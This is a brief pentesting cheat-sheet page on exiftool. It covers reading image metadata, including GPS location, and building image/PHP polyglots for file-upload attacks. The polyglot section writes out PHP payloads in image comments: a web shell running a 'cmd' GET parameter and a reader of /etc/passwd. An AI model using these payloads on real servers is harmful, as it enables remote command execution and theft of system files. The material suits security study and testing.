---
title: Exiftool
desc: Read and write meta information in files. It’s also used to create a polyglot. 
tags: [FileUpload, ReverseShell, Steganography]
alts: [Binwalk, FileUploadVulnerabilities, Steghide, Stegseek, Xxd, Zsteg]
website:
render_with_liquid: false
---

## Read Meta Information

```sh
exiftool example.jpg

# If you get the GPS Latitude/Longitude, you can get the location by searching on Google Map
# e.g. GPS Latitude: 54 deg 17' 41.27" N
# e.g. GPS Longitude: 2 deg 15' 1.33" W
# Input "54 17' 41.27" N 2 15' 1.33" W" in the search form on Google Map.
```

<br />

## Create A Polyglot

It's assumed that you have an image file.

```sh
exiftool -Comment="<?php system('ls'); ?>" example.png
exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' exploit.png
exiftool -Comment="<?php echo 'START ' . file_get_contents('/etc/passwd') . ' END'; ?>" example.jpg -o polyglot.php
```